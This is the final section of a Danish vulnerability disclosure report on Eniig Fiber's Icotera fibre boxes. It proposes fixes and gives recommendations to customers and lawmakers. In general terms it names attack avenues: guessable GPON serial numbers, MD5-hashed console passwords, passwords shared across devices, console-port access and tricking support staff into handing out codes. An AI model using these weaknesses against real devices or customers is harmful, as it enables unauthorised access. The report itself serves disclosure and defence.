+<p><b>Problem:</b> Tiden man skal bruge på at opdater udstyre og lave nye features, ganges op med antallet af forskellige modeller.
+</p><p><b>Løsning:</b> Overvej værdien det giver at reducer antallet af forskellige fiberboks modeller.
+</p>
+<h3><span id="Lav_et_service_katalog">Lav et service katalog</span></h3>
+<p><b>Problem:</b> Der findes en del skjulte services som man ikke kan 
+få kendskab til fra Eniigs officielle hjemmeside. Det er services som at
+ man kan få en fiberboks sat i bridge mode, og at man kan få aktiveret 
+alle ethernet portene i fiberboksen til LAN.
+</p><p><b>Løsning:</b> Lav et service katalog med mulighederne, eller gør dem tilgængelige via selvbetjening.
+</p>
+<h3><span id="Support_forum_for_kunder_der_selv_til_terminer_GPON">Support forum for kunder der selv til terminer GPON</span></h3>
+<p><b>Problem:</b> Der er mange der ønsker helt at slippe for at have en
+ fiberboks, og selv terminer GPON. Der ydes ikke support over for disse 
+kunder.
+</p><p><b>Løsning:</b> Lav et forum hvis de kunder kan mødes og hjælpe hinanden. Jeres egne teknikker kan kikke med.
+</p>
+<h2><span id="Forbedringsforslag_til_Icotera">Forbedringsforslag til Icotera</span></h2>
+<h3><span id="GPL">GPL</span></h3>
+<p><b>Problem:</b> Det er ikke muligt at downloade sourcekoden, som er 
+under GPL. At er benyttes GPL software nævnes ikke i indpakning, på 
+boksen eller i webinterfacet.
+</p><p><b>Løsning:</b> Følg TP-link og Edimax eksempel. Udgiv hele build miljøet, så det er nemt at bygge ens egen firmware.
+</p>
+<h3><span id="GPON_serienummer">GPON serienummer</span></h3>
+<p><b>Problem:</b> GPON serienummeret er ikke tilfældigt. Det er således meget nemt at gætte et andet serienummer.
+</p><p><b>Løsning:</b> Fortæl kunderne at det er nødvendigt at have en unik GPON kode per CPE.
+</p>
+<h3><span id="Provisioning_via_HTTPS">Provisioning via HTTPS</span></h3>
+<p><b>Problem:</b> Provisioning er ikke muligt via HTTPS, det er kun 
+muligt via ukrypteret protokoller som HTTP, FTP og TFTP. Det vil give at
+ ekstra lag af sikkerhed at understøtte det.
+</p><p><b>Løsning:</b> Kompiler wget med https support. Det fylde noget mere. Men der er masse af plads på enheden.
+</p>
+<h3><span id="Default_ops.C3.A6tning">Default opsætning</span></h3>
+<p><b>Problem:</b> Default opsætningen ikke sikker. Det kræver en indsat at huske ændre alle koder og sætte firewallen op.
+</p><p><b>Løsning:</b> Gør login kun muligt via konsol i default opsætningen (når nej, den har I slået fra i panik).
+</p>
+<h3><span id="Der_er_ingen_guide_til_at_lavet_det_sikkert">Der er ingen guide til at lavet det sikkert</span></h3>
+<p><b>Problem:</b> Manualen fortæller ikke hvordan man laver en god sikker opsætning.
+</p><p><b>Løsning:</b> Lav nogle eksempler på det.
+</p>
+<h3><span id="Connection-tracking">Connection-tracking</span></h3>
+<p><b>Problem:</b> Det ser ud til at der nogen gange kan være problemer 
+med at TCP-timeout kun er sat til 600 sekunder i stedet for 7440 i 
+/ect/scripts/network. Specielt hvis man sætter en router bag ved 
+fiberboksen, og sætter den i DMZ i fiberboksen.
+</p><p><b>Løsning:</b> Hvad er formålet ved at kun at have den på 600? Sæt den til 7440.
+</p>
+<h3><span id="Koder_hashet_med_MD5">Koder hashet med MD5</span></h3>
+<p><b>Problem:</b> Koder til konsol login er hashet med md5. Hvilket 
+betyder at teknikker der ser konfigurationen ikke opdager at en usikker 
+kode er brugt. Samtidigt er det muligt at knække koden eller finde en 
+anden der fungere i stedet for. Givet nok CPU kraft.
+</p><p><b>Løsning:</b> Enten gem koden i klartekst eller i en sikker hash. MD5 er det dårligste valg.
+</p>
+<h2><span id="Forbedringsforslag_til_Center_for_Cybersikkerhed">Forbedringsforslag til Center for Cybersikkerhed</span></h2>
+<h3><span id="Dropboks_via_https_over_tor">Dropboks via https over tor</span></h3>
+<p><b>Problem:</b> Hvis man gerne vil overlevere information sikkert og 
+anonymt. Så kræver det meget tid at sætte en email klient op der bruger 
+kryptering og tor-netværket.
+</p><p><b>Løsning:</b> Opret et hjemmeside der kan kontaktes via HTTPS 
+igennem tor-netværket. På siden skal man kunne sende beskeder og filer 
+til jer. Gør det eventuelt muligt at tjekke siden igen senere for svar.
+</p>
+<h2><span id="Konklusion">Konklusion</span></h2>
+<p>Alle går ind for IT-sikkerhed, så længe det ikke koster ressourcer, 
+forstyrre brugerne eller risiker at forstyrre driften. En anden ting er,
+ at man som systemadministrator ikke kan se sit system udefra, på grund 
+af den insider-viden man har. Man kan se sig blind på fejl ingen vil 
+finde, og overse de mest oplagte fejl. 
+</p><p>Formålet med denne rapport var at vise Eniig hvordan deres system
+ så ud udefra, og give et motiv til at få fejlene rettet, også selv det 
+kostede ressourcer og risikerede at forstyrre driften og brugerne.
+</p><p>Det er lykkes et godt stykke af vejen. Hullerne i FTP-serven var 
+næppe blevet så grundigt lukket, hvis informationen var blevet send til 
+drift-afdelingen, i stedet for til en journalist. Sandsynligvis havde 
+Eniig kun gjort det svære at finde FTP loginet.
+</p><p>Som det ser ud nu, er der ikke nogen måde at masse-overtage alle 
+fiberboksene på. Men det er stadig muligt at lave målrettet angreb, for 
+eksempel ved at lokke koder man ikke er berettiget til ud af supporten. 
+Man kunne også ønske sig at der nogen steder var flere lag af sikkerhed,
+ for eksempel imellem fiberbokse på same subnet. Der er stadig mange (4)
+ koder der er ens på alle fiberbokse.
+</p>
+<h3><span id="Kort_version">Kort version</span></h3>
+<ul><li> Sikkerheden hos Eniig Fiber er nu på niveau man kan forvente af en ISP.</li>
+<li> Icotera havde kun lavet én fejl: Sikkerhedshullet i webinterface. 
+Det ville kun have givet adgang til ens egen fiberboks, havde Eniig sat 
+udstyret korrekt op. Uden denne fejl var 3 af 4 veje ind i Eniigs stadig
+ system mulige.</li>
+<li> Næsten alt Linux baseret elektronik har en konsol-port. Det er helt
+ normalt at man kan få adgang til den. Det samme gælder netværks-udstyr 
+generelt. Det er derfor man fysik sikre det, og hvis det ikke er muligt.
+ Så forventer man at andre kan få adgang til det.</li></ul>
+<h3><span id="Anbefaling_til_ISP_kunder_med_tekniske_f.C3.A6rdigheder">Anbefaling til ISP kunder med tekniske færdigheder</span></h3>
+<p>Uanset hvilken ISP man har, skal man være opmærksom på at hvis ISPen 
+router dit LAN. Så har ISPen og alle der kan hacke ISPen adgang til dit 
+LAN. Dette er specielt problematisk for folk har mange dimser tilsluttet
+ som NAS, IP-cams og printere. Men ikke holder dem opdateret, eller 
+bruger default eller samme kode på dem alle. Mængden er sådanne dimser 
+(IOT) er kraftigt stigene, og de stoler typisk på et LANet er sikkert.
+</p><p>Anbefaling her fra, er at man som minimum skifter WiFi-koden på 
+routeren udleveret af ISPen. Brug ikke samme kode andre steder, og sørg 
+for den er kompleks nok til at den ikke kan gættes af en maskine (12 
+tilfældige små bogstaver er godt nok, og er nemt at indtaste på en 
+mobilenhed). Skift også gerne koden til routeren selv, genbug ikke koden
+ til WiFi eller noget andet.
+</p><p>Endnu bedre er det at selv at router sit LAN. Men så skal man 
+selv sørger for at holder sin router opdateret, og skifte alle default 
+koder. Husk at slå WiFi fra på routeren udlevet af ISPen. Allerbedst er 
+det hvis man slet ikke bruger routeren udlevet af ISPen, ved at selv at 
+terminer den forbindelse-teknologi der benyttes.
+</p>
+<h3><span id="Anbefaling_til_ISP_kunder_uden_tekniske_f.C3.A6rdigheder">Anbefaling til ISP kunder uden tekniske færdigheder</span></h3>
+<p>Din internetudbyder (og alle der kan hacke dem) har adgang til dit 
+hjemmenetværk. Det er ikke et problem for mobiltelefoner og tablets, der
+ er lavet til at komme på fremmede netværk. Men det er et problem for 
+mange dimser der regner dit hjemmenetværk for sikkeret. Specielt hvis de
+ har følsomme oplysninger, hvilket printere, netværks-harddiske og 
+overvågnings-kameraer typisk har. Du kan afhjælpe prolemmet ved at bruge
+ din egen router, frem for den udlevet af din internetudbyder. Men der 
+er stor risiko for at du gør problemet større, fordi du ikke sættet din 
+router korrekt op.
+</p>
+<h3><span id="Anbefaling_til_politikere">Anbefaling til politikere</span></h3>
+<p>Når mange netværks-tilsluttet enheder er usikre på samme måde, gør 
+det det nemt at masse udnyttet dem. Dette kan foreksempel bruges til at 
+lægge internettet ned i hele Danmark, eller til målrettet spionage. Som 
+det er nu, stoler vi som samfund blindt på at dem der sætter enheder op,
+ laver en sikker opsætning, og holder dem opdateret. Det burde være 
+sådan, at når man når over et vist antal enheder, så skal deres 
+opsætning certificeres.
+</p><p>Borgere der opdager sikkerhedshuller har ingen motivation til at 
+rapporter dem, udover deres egen moral. Tvært imod så risikere de at 
+blive politianmeldt, eller miste deres arbejde. Lav en måde at fortæller
+ om sikkedeshuller på, der beskytter anmelderes anonymitet, og frigør 
+anmelderen for staffansvar inden for rimelige grænser. Beløn indsatsen.
+</p>
+</div>
+</div>
+</body>
+</html>
